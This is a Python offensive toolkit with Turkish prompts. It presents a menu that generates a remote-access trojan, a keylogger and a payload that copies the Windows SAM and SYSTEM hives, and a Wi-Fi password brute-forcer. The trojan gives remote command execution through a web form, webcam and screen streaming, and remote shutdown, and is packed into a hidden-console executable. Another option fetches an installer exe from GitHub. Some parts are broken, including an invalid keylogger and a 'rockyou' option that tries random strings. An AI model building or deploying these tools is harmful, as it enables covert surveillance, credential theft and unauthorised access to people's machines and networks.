print(r"""


\______   \  |__ _____    _____/  |_  ____   _____  /   |   \_____    ____ |  | __
 |     ___/  |  \\__  \  /    \   __\/  _ \ /     \/    ~    \__  \ _/ ___\|  |/ /
 |    |   |   Y  \/ __ \|   |  \  | (  <_> )  Y Y  \    Y    // __ \\  \___|    < 
 |____|   |___|  (____  /___|  /__|  \____/|__|_|  /\___|_  /(____  /\___  >__|_ \
               \/     \/     \/                  \/       \/      \/     \/     \/
""")

import sys
import os
try:
 from flask import Flask, Response, request
 import cv2
 import psutil
 import os
 import pyautogui
 import numpy as np
 import time
 import requests
 import os
 import subprocess
except ImportError:
    try:
        from flask import Flask, Response, request
    except ImportError:
        print("bulunamayan kütüphane flask")
    try:
       import cv2
    except ImportError:
        print("bulunamayan kütüphane opencv-python")
    try:
       import psutil
    except ImportError:
        print("bulunamayan kütüphane psutil")
    try:
        import os
    except ImportError:
        print("bulunamayan kütüphane os")
    try:
        import pyautogui
    except ImportError:
        print("bulunamayan kütüphane pyautogui")
    try:
        import numpy
    except ImportError:
        print("bulunamayan kütüphane numpy")    
    try:
        import subprocess
    except ImportError:
        print("bulunamayan kütüphane subprocess")                                                     
    print("gerekli kütüphaneleri yükleyin(requirements.txt)")
    print("pip install -r requirements.txt")
    sys.exit(1)
def crack(ssid):
 crckpas=input("lütfen şifrelerin hazır olduğu dosyayı yazınız:")
 if crckpas=="rockyou":
  import string
  import random
  allchars = list(string.ascii_letters + string.digits)  # a-zA-Z0-9
  while True:
        uzunluk = random.randint(8, 15)
        sifre = ''.join(random.choices(allchars, k=uzunluk))

        xml_icerik = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{sifre}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

        xml_dosya = rf"c:/users/{os.getlogin()}/{ssid}.xml"

    # XML dosyasını oluştur
        with open(xml_dosya, "w") as dosya:
           dosya.write(xml_icerik)

        try:
        # Wi-Fi profilini ekle
         subprocess.run(f'netsh wlan add profile filename="{xml_dosya}"', shell=True)
        
        # Ağa bağlan
         subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
         print(f"[+] '{ssid}' için {sifre} deneniyor")
         time.sleep(2)
        except Exception as e:
         print("[-] Hata:", e)

 else:
      with open(crckpas) as passs:
       for sifre in passs.readlines():
        xml_icerik = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{sifre}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

        xml_dosya = rf"c:/users/{os.getlogin()}/{ssid}.xml"

    # XML dosyasını oluştur
        with open(xml_dosya, "w") as dosya:
         dosya.write(xml_icerik)

        try:
        # Wi-Fi profilini ekle
         subprocess.run(f'netsh wlan add profile filename="{xml_dosya}"', shell=True)
        
        # Ağa bağlan
         subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
         print(f"[+] '{ssid}' için {sifre} deneniyor")
         time.sleep(2)
        except Exception as e:
         print("[-] Hata:", e)  







print("[1] make payload(advenced reverse shell)")
print("[2] install hexstorm tool")
print("[3] make keylogger")
print("[4] make payload for sam and system")
print("[5] crack wifi password")
input_choice = input(f"{os.getlogin()}@phantomhack>> ")
if input_choice == "1":
    nm=input("payload name: ")
    with open(f"{nm}.py","w") as payload:
        payload.write(r'''
from flask import Flask, Response, request
import cv2
import psutil
import os
import pyautogui
import numpy as np
import time
import sys
import requests
import os







app= Flask(__name__)
kamera = cv2.VideoCapture(0)
def info():
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    ip= requests.get("https://api.ipify.org?format=json").json()["ip"]
    mac= requests.get("https://api.macaddress.io/v1?apiKey=at_2f3a4e5b6c7d8e9f0&output=json").json()["macAddress"]
    battery = psutil.sensors_battery()
    if battery:
        battery_percentage = battery.percent
        battery_status = "Charging" if battery.power_plugged else "Not Charging"
    else:
        battery_percentage = None
        battery_status = None
    tasks = psutil.pids()
    tasks_count = len(tasks)
    task_names = []
    for task in tasks:
        try:
            task_info = psutil.Process(task)
            task_names.append(task_info.name())
        except psutil.NoSuchProcess:
            pass
    tasks_count = len(task_names)
    platform = os.name
    return f"CPU: {cpu}%, RAM: {ram}%, Disk: {disk}%, IP: {ip}, MAC: {mac}, Battery: {battery_percentage}%, Status: {battery_status}, Tasks Count: {tasks_count}, Platform: {platform}"
@app.route('/info')
def sistem_bilgisi():
    bilgi = info()
    return bilgi
@app.route('/')
def anasayfa():
    return  """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flask Uygulaması</title>
    </head>
    <body>
        <h1>Merhaba, Flask!</h1>
        <p>Bu bir HTML sayfasıdır.</p>
        <form action="/entry" method="post">
            <label for="entry">makinede çalıştırılan komut:</label>
            <input type="text" id="entry" name="entry">
            <button type="submit">işle</button>
        </form>
        <ul>
            <li><a href="/info">Sistem Bilgisi</a></li>
            <li><a href="/kamera">Kamera Yayını</a></li>
            <li><a href="/foto">Fotoğraf Çek</a></li>
            <li><a href="/screenshot">Ekran Akışı</a></li>
            <li><a href="/shutdown">Sistemi Kapat</a></li>
            <li><a href="/restart">Sistemi Yeniden Başlat</a></li>
        </ul>
    </body>
    </html>
    """
@app.route('/entry', methods=['POST', 'GET'])
def entry():
    user_input = request.form.get('entry') 
    output = os.popen(user_input).read()
    return f"<pre>{output}</pre>"
@app.route('/screenshot')
def ekran_akisi():
    def generate_screenshots():
        while True:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            _, buffer = cv2.imencode('.jpg', frame)
            frame_bytes = buffer.tobytes()          
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')

            time.sleep(0.1)

    return Response(generate_screenshots(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')
@app.route('/foto') 
def photo():
    basarili, kare = kamera.read()
    if not basarili:
        return "Kare alınamadı", 500
    _, buffer = cv2.imencode('.jpg', kare)
    kare_bytes = buffer.tobytes()
    return Response(kare_bytes, mimetype='image/jpeg')
@app.route('/foto2')
def arkakamera():
    kamera = cv2.VideoCapture(1)
    basarili, kare = kamera.read()
    if not basarili:
        return "Kare alınamadı", 500
    _, buffer = cv2.imencode('.jpg', kare)
    kare_bytes = buffer.tobytes()
    return Response(kare_bytes, mimetype='image/jpeg')
def capture():
    while True:
        basarili, kare = kamera.read()
        if not basarili:
            break
        _, buffer = cv2.imencode('.jpg', kare)
        kare_bytes = buffer.tobytes()
        yield Response(b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + kare_bytes + b'\r\n' + b'\r\n\r\n')
        
        time.sleep(0.1)
 
@app.route('/kamera')
def kamera_yayini():
    return Response(capture(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')
@app.route("/shutdown")
def shutdown():
    os.system("shutdown /s /t 0")
    return "Sistem kapatılıyor..."
@app.route("/restart")
def restart():
    os.system("shutdown /r /t 0")
    return "Sistem yeniden başlatılıyor..."

     
if __name__ == '__main__':
    
    app.run(debug=True, host="0.0.0.0", port=8080)
''')
    print(f"{nm}.py oluşturuldu.")
    os.system(f"pyinstaller {nm} --onefile --noconsole")
    print("exe halinde payload oluşturuldu")
    print("payload oluşturma tamamlandı.")
if input_choice == "2":
    print("githur1234 hexstorm yükleniyor (aynı yazılımcıdan çıktı)")
    requests.get("https://github.com/githur1234/pentest/raw/refs/heads/main/instaler.exe")
if input_choice == "3":
    nm=input("keylogger name: ")
    with open(f"{nm}.py","w") as keylogger:
        keylogger.write('''
from flask import Flask
import os
import keyboard
import time
            
app=flask.Flask(__name__)
@app.route('/')
pressed_keys=[]
def index():
    if keyboard.read_event().event_type==keyboard.KEY_DOWN:
              pressed_keys.append(event.name)
    return pressed_keys 
    
''')
    print("exe halinde çıkarılıyor")
    try:
     os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
    except OSError:
     os.system("python -m pip install pyinstaller")
     os.system(rf"cd C:\Users\{os.getlogin()}\AppData\Local\Packages\PythonSoftwareFoundation.Python.{sys.version_info.major}.{sys.version_info.minor}_qbz5n2kfra8p0\LocalCache\local-packages\Python{sys.version_info.major}{sys.version_info.minor}\Scripts")
     os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
if input_choice=="4":
    nm=input("payload name:")
    with open(f"{nm}.py","w+") as payload2:
        payload2.write('''
from shadowcopy import shadow_copy
import os
shadow_copy("c:/windows/system32/config/sam",os.path.splitdrive(os.getcwd())[0]+"SAM.txt")
shadow_copy("c:/windows/system32/config/system",os.path.splitdrive(os.getcwd())[0]+"system.txt")
''')
    try:
     os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
    except OSError:
     os.system("python -m pip install pyinstaller")
     os.system(rf"cd C:\Users\{os.getlogin()}\AppData\Local\Packages\PythonSoftwareFoundation.Python.{sys.version_info.major}.{sys.version_info.minor}_qbz5n2kfra8p0\LocalCache\local-packages\Python{sys.version_info.major}{sys.version_info.minor}\Scripts")
     os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
if input_choice=="5":
         crack(input("kırılıcak ağın adı:"))
       
